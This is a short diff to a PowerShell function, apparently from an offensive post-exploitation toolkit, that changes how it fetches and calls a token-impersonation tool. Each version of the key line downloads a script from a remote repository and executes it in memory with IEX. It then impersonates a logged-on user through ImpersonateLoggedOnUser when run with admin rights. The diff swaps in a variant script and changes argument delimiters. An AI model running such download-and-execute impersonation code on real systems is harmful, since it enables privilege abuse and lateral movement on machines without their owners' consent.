@@ -3991,7 +3991,7 @@ function SharpImpersonation
 if (isadmin)
 {
 
-IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1')
+IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonationNoSpace.ps1')
 
 if ($list)
 {
@@ -4000,7 +4000,7 @@ if ($list)
 }
 elseif($listwmi)
 {
-    Invoke-SharpImpersonation -Command "list wmi"
+    Invoke-SharpImpersonation -Command "list#wmi"
     return
 }
 
@@ -4011,11 +4011,11 @@ if($username -eq "")
 
 if ($CurrentThread)
 {
-    Invoke-SharpImpersonation -Command "user:$username technique:ImpersonateLoggedOnuser"
+    Invoke-SharpImpersonation -Command "user:$username#technique:ImpersonateLoggedOnuser"
 }
 else
 {
-    Invoke-SharpImpersonation -Command "user:$username technique:ImpersonateLoggedOnuser"
+    Invoke-SharpImpersonation -Command "user:$username#technique:ImpersonateLoggedOnuser"
 }
 
 }
